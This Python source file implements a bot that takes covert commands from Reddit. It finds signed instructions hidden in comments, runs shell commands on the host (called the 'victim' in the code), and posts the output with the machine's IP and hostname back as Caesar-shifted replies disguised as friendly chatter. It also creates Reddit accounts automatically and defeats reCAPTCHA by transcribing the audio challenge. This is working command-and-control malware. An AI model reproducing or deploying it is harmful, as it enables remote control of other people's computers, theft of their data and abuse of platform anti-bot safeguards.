import copy
import os
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium import webdriver
import tkinter as tk
import ecdsa
import time
import re
import string
import random
from threading import Thread
import undetected_chromedriver as uc
import subprocess
import requests
import speech_recognition as sr
from pydub import AudioSegment
import socket
import hashlib
import json

# global parameters
AudioSegment.converter = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffmpeg.exe'
AudioSegment.ffmpeg = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffmpeg.exe'
AudioSegment.ffprobe = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffprobe.exe'

PATH = r'chromedriver.exe'


def shift_encrypt(message, shift):
    encrypted_message = ''
    for char in message:
        if char.isalpha():
            # shift the letter by the specified value
            encrypted_char = chr((ord(char) - 97 + shift) % 26 + 97)
        else:
            # leave non-alphabetic characters unchanged
            encrypted_char = char
        encrypted_message += encrypted_char
    return encrypted_message


def writeListToFile(key, list):
    with open('config.json', 'r') as openfile:
        dictionary = json.load(openfile)
    dictionary[key] = list
    json_object = json.dumps(dictionary, indent=3)
    with open("config.json", "w") as outfile:
        outfile.write(json_object)


class Bot:
    def __init__(self, bootstrap):
        self.url = "https://www.reddit.com/"
        self.bootstrap = bootstrap
        self.current_keys = []
        self.next_keys = []
        self.prev_comments = []
        self.login_email = ""
        self.login_password = ""
        self.login_username = ""
        self.victimInfo = ""
        self.rpDoneTasks = []
        key = """-----BEGIN PUBLIC KEY-----
MFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAElvBGU7IXfC6cDRyKqv6L4MrXykyTL+lQ
R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
-----END PUBLIC KEY-----
"""
        createFile = open("public_key.pem", "w")
        createFile.write(key)
        createFile.close()

        try:
            if not os.path.isfile("config.json"):
                self.signUpToReddit()
                login = "{},{},{}".format(self.login_email, self.login_username, self.login_password)
                dictionary = {"login": login, "prev_comments": [], "rpDoneTasks": []}
                json_object = json.dumps(dictionary, indent=3)
                with open("config.json", "w") as outfile:
                    outfile.write(json_object)

            else:
                with open('config.json', 'r') as openfile:
                    dictionary = json.load(openfile)
                login_data = dictionary["login"].split(",")
                self.login_email = login_data[0]
                self.login_username = login_data[1]
                self.login_password = login_data[2]
                try:
                    self.prev_comments = dictionary["prev_comments"]
                    self.rpDoneTasks = dictionary["rpDoneTasks"]
                except Exception as e:
                    print(e)

        except Exception as e:
            print(e)

    def start(self):
        if os.path.isfile("config.json"):
            try:
                data = self.prev_comments[-1][1]
                if len(data) > 0:
                    return self.GetNextCommand(data[0], data[1], data[2], data[3])

            except:
                pass

        return self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])

    def getVictimInfo(self):
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        return "{}@{}".format(IPAddr, hostname)

    def writeBack(self, data, err, browser, commentURL):
        # load the comment URL
        browser.get(commentURL)

        # get ID of the comment
        id = commentURL.split("/")[len(commentURL.split("/")) - 2]

        time.sleep(8)

        # reply of the comment
        WebDriverWait(browser, 20, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH, '//*[@id="t1_{}"]/div[2]/div[3]/div[3]/div[2]/button[1]'.format(id)))).click()

        time.sleep(2)

        # insert to data to the reply
        if len(self.victimInfo) == 0:
            self.victimInfo = self.getVictimInfo()
        enc = "{} {} {}".format(data, err, self.victimInfo)
        enc = shift_encrypt(enc, 16)
        replyData = """It's so correct!! 
    send you big like XOXO 
    {}""".format(enc)

        reply = browser.find_element_by_xpath(
            '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div'.format(id))
        reply.send_keys(replyData)

        time.sleep(2)

        # click on reply of the comment
        WebDriverWait(browser, 20, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH,
                 '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[3]/div[1]/button[1]'.format(id)))).click()

        # login to the system
        loginIframe = browser.find_element_by_css_selector(
            "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")

        # switch to the "reCAPTCHA" iframe context
        browser.switch_to.frame(loginIframe)

        # click on login
        WebDriverWait(browser, 20, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH,
                 '/html/body/div/main/div[1]/div/div/form/div[4]/a'))).click()

        time.sleep(5)

        # fill the user info for login
        username = browser.find_element_by_xpath('//*[@id="loginUsername"]')
        username.send_keys(self.login_username)

        time.sleep(3)

        password = browser.find_element_by_xpath('//*[@id="loginPassword"]')
        password.send_keys(self.login_password)

        time.sleep(3)

        # click on log in
        WebDriverWait(browser, 20, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH,
                 '/html/body/div/main/div[1]/div/div/form/fieldset[4]/button'))).click()

        time.sleep(4)


    def CommandHandle(self, cmd, parameters, browser=None, dataToSave="", commentURL=""):
        result = hashlib.md5(dataToSave.encode('utf_8')).hexdigest()
        print(result, self.rpDoneTasks, type(self.rpDoneTasks))
        if cmd == "pm" and result not in self.rpDoneTasks:
            self.rpDoneTasks.insert(0, result)
            writeListToFile("rpDoneTasks", self.rpDoneTasks)
            root = tk.Tk()
            root.title("Message from Reddit-Bot")
            root.geometry("400x200")
            root.configure(bg="white")
            label = tk.Label(root, text=parameters, font=("Calibri", 13))
            label.pack(pady=70, padx=50)
            label.pack()
            root.mainloop()

        # command that makes the bot to get info (accroding to given param) from vicitm OS
        if cmd == "rp" and result not in self.rpDoneTasks:  # rp
            res = subprocess.Popen(parameters, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            data, err = res.communicate()
            self.writeBack(data, err, browser, commentURL)
            self.rpDoneTasks.insert(0, result)
            writeListToFile("rpDoneTasks", self.rpDoneTasks)

    def GetNextCommand(self, sub_reddit, key1, key2, key3):
        # set parameters for web driver
        parameters = webdriver.ChromeOptions()
        parameters.headless = False  # display a user interface

        # create an instance of a web driver that corresponds to Chrome
        browser = webdriver.Chrome(options=parameters,
                                   executable_path=PATH)
        browser.maximize_window()

        # load the web page corresponding to the given url
        browser.get(self.url)

        time.sleep(2)

        # find the search bar on the page
        search_bar = browser.find_element_by_css_selector("#header-search-bar")

        # insert and select the given subreddit name and keys in the search bar
        search_bar.send_keys("r/{}".format(sub_reddit))
        time.sleep(2)
        search_bar.send_keys(Keys.ENTER)
        search_bar.send_keys(" {} AND {} AND {} ".format(key1, key2, key3))
        time.sleep(2)
        search_bar.send_keys(Keys.ENTER)
        time.sleep(5)

        # wait for the "Comments" button to become clickable and click on it
        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,
                                                                        "/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div/div/div[1]/div[1]/div[1]/a[2]/button"))).click()
        time.sleep(4)

        # find all comments
        comments = browser.find_elements_by_xpath("//div[contains(@class, 'Comment')]")

        # if no relevant comments found [path corrupted], update status and exit
        if len(comments) == 0:
            status = 3
            return status, None

        # update current keys
        self.current_keys = [sub_reddit, key1, key2, key3]

        # check signature, if correct do command, save comment id, and get next keys, if incorrect check next comment
        for comment in comments:
            # extract message and signature from comment
            full_msg = comment.find_element_by_xpath("./div[3]/div[2]/div").text
            lines = full_msg.split("\n")[:-1]
            msg_str = '\n'.join(lines)
            msg = bytes(msg_str, "utf-8")

            # load public key from file
            with open('public_key.pem', 'rb') as f:
                pem_data = f.read()
                vk = ecdsa.VerifyingKey.from_pem(pem_data)

            # verify signature
            try:
                signature = bytes.fromhex(full_msg.split("\n")[-1])
                vk.verify(signature, msg)

                # save link to comment in
                a_element = browser.find_element_by_xpath(
                    '/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[1]/div/div/div/div/div[2]/div/div[2]/div/div[3]/div[1]/span/a')
                href = a_element.get_attribute('href')
                comment_url = href.split('?')[0]
                self.prev_comments.append((comment_url, [sub_reddit, key1, key2, key3]))
                try:
                    writeListToFile("prev_comments", self.prev_comments)
                except Exception as e:
                    print(e)

                # execute the command if it exists
                start_index = msg_str.find("😍")
                if start_index != -1:
                    end_index = msg_str.find("\n", start_index)

                    # extract the message starting from the emoji and ending at \n
                    command_tmp = msg_str[start_index:end_index]
                    pattern = r'([\U0001F600-\U0001F64F])(\w{2})\*(.*)'

                    # search for the pattern in the string and extract the captured groups
                    match = re.search(pattern, command_tmp)

                    if match:
                        cmd = match.group(2)
                        parameters = match.group(3)
                        dataToSave = "{},{},{},{}".format(sub_reddit, key1, key2, key3)

                        # execute the command in a new thread so the bot continue to run and while the command work on
                        if cmd == "pm":
                            t = Thread(target=self.CommandHandle, args=(cmd, parameters, None, dataToSave))
                            t.start()

                        else:
                            self.CommandHandle(cmd, parameters, browser, dataToSave, comment_url)

                # get next keys
                pattern = r"{} {} {}\s+(\w+\s+\w+\s+\w+\s+\w+)".format(key1, key2, key3)
                key_matches = re.findall(pattern, comment.text)

                # find next keys
                if key_matches and not any("1" in string for string in key_matches) and not any(
                        "2" in string for string in key_matches):
                    status = 1
                    next_keys = key_matches[0].split()
                    self.next_keys = next_keys
                    browser.quit()
                    return status, next_keys

                # didn't find next keys [end of path]
                else:
                    status = 2
                    return status, None

            # if signature incorrect change status to 3 and check next comment
            except Exception as E:
                status = 3

        browser.quit()
        return status, None

    def GoBack(self):
        # set parameters for web driver
        parameters = webdriver.ChromeOptions()
        parameters.headless = False

        # create an instance of a web driver that corresponds to Chrome
        browser = webdriver.Chrome(options=parameters,
                                   executable_path=PATH)
        browser.maximize_window()
        tempCommentsList = copy.deepcopy(self.prev_comments)
        for prev_comment in reversed(self.prev_comments):
            # load the web page corresponding to the given url
            browser.get(prev_comment[0])
            time.sleep(2)

            # extract message and signature from comment
            full_msg = browser.find_element_by_xpath(
                "/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div[1]/div[2]/div[5]/div/div/div/div[1]/div/div/div/div[2]/div[3]/div[2]/div").text
            lines = full_msg.split("\n")[:-1]
            msg_str = '\n'.join(lines)
            msg = bytes(msg_str, "utf-8")

            # load public key from file
            with open('public_key.pem', 'rb') as f:
                pem_data = f.read()
                vk = ecdsa.VerifyingKey.from_pem(pem_data)

            # verify signature
            try:
                signature = bytes.fromhex(full_msg.split("\n")[-1])
                vk.verify(signature, msg)

                # get next keys
                lines = msg_str.splitlines()
                next_keys = lines[-1].split()

                if len(next_keys) != 4:
                    status = 2
                    self.prev_comments = tempCommentsList
                    return status, prev_comment[1]

                status = 1
                self.next_keys = next_keys
                time.sleep(1)
                browser.quit()
                self.prev_comments = tempCommentsList
                return status, next_keys

            # if signature incorrect change status to 3 and check next comment
            except Exception as E:
                status = 3
            tempCommentsList.pop(-1)

        # if all prev comments corrupted, use the bootstrap
        browser.quit()
        self.prev_comments = tempCommentsList
        status, next_keys = self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2],
                                                self.bootstrap[3])
        return status, next_keys

    def transcribe(self, url):
        voiceFileNameMp3 = "voiceFromReddit.mp3"
        voiceFileNameWav = "voiceFromReddit.wav"

        # download the audio capture form reddit
        with open(voiceFileNameMp3, "wb") as f:
            r = requests.get(url, allow_redirects=True)
            f.write(r.content)
            f.close()

        time.sleep(5)

        # convert to wav
        AudioSegment.from_mp3(voiceFileNameMp3).export(voiceFileNameWav, format="wav")

        r = sr.Recognizer()
        text = ""
        with sr.AudioFile(voiceFileNameWav) as source:
            # listen for the data (load audio to memory)
            audio_data = r.listen(source)
            # recognize (convert from speech to text)
            text = r.recognize_google(audio_data)
        return text

    def signUpToReddit(self):
        # set parameters for web driver
        parameters = uc.ChromeOptions()
        parameters.headless = False  # display a user interface

        # create an instance of a web driver that corresponds to Chrome
        driver = uc.Chrome(options=parameters,
                           executable_path=PATH)
        driver.maximize_window()

        # load the web page corresponding to the given url
        driver.get(self.url)

        # click on the "Join Reddit" button
        WebDriverWait(driver, 10, 1).until(EC.element_to_be_clickable(
            (By.XPATH, "/html/body/div[1]/div/div[2]/div[2]/div/div[1]/div[2]/button"))).click()

        iframe = driver.find_element_by_css_selector("iframe._25r3t_lrPF3M6zD2YkWvZU")

        # switch to the "Join Reddit" iframe context
        driver.switch_to.frame(iframe)

        # insert random email into email field
        email_field = driver.find_element_by_css_selector("#regEmail")
        char = string.ascii_lowercase + string.digits
        random_str = "".join(random.choices(char, k=7))
        self.login_email = "{}@gmail.com".format(random_str)
        email_field.send_keys(self.login_email)
        time.sleep(2)

        # click "Continue"
        WebDriverWait(driver, 10, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH, "/html/body/div/main/div[1]/div/div/form/fieldset[2]/button"))).click()

        time.sleep(4)
        userName = driver.find_element_by_css_selector("#regUsername")
        self.login_username = userName.get_attribute('value')

        time.sleep(3)

        # insert password
        pass_field = driver.find_element_by_css_selector("#regPassword")
        char = string.ascii_lowercase + string.digits + string.ascii_uppercase
        random_str = "".join(random.choices(char, k=14))
        self.login_password = "{}".format(random_str)
        pass_field.send_keys(self.login_password)

        time.sleep(2)
        pass_field.send_keys(Keys.ENTER)
        time.sleep(3)

        iframeReCAPTCHA = driver.find_element_by_css_selector("#g-recaptcha > div > div > iframe")

        # switch to the "reCAPTCHA" iframe context
        driver.switch_to.frame(iframeReCAPTCHA)

        # click on reCAPTCHA button
        WebDriverWait(driver, 10, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH, '//*[@id="recaptcha-anchor"]/div[1]'))).click()

        time.sleep(3)

        driver.switch_to.default_content()

        iframeReCAPTCHA = driver.find_element_by_css_selector(
            "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")

        # switch to the "reCAPTCHA" iframe context
        driver.switch_to.frame(iframeReCAPTCHA)

        iframeReCAPTCHA2 = driver.find_element_by_css_selector(
            "body > div:nth-child(10) > div:nth-child(2) > iframe")

        # switch to the "reCAPTCHA" iframe context
        driver.switch_to.frame(iframeReCAPTCHA2)

        # choose audio
        WebDriverWait(driver, 10, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH, '//*[@id="recaptcha-audio-button"]'))).click()

        time.sleep(3)

        # download and convert voice to text
        text = self.transcribe(driver.find_element(By.XPATH, '//*[@id="rc-audio"]/div[7]/a').get_attribute('href'))

        # insert the converted text to input
        voice = driver.find_element_by_css_selector("#audio-response")
        voice.send_keys(text)

        time.sleep(3)

        # click the verify button
        WebDriverWait(driver, 10, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH, '//*[@id="recaptcha-verify-button"]'))).click()

        time.sleep(3)

        # back to previous iframe
        driver.switch_to.default_content()

        iframeReCAPTCHA = driver.find_element_by_css_selector(
            "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")

        # switch to the "reCAPTCHA" iframe context
        driver.switch_to.frame(iframeReCAPTCHA)

        WebDriverWait(driver, 20, 1).until(
            EC.element_to_be_clickable(
                (By.XPATH, '/html/body/div[1]/main/div[2]/div/div/fieldset/button'))).click()

        time.sleep(3)

        driver.quit()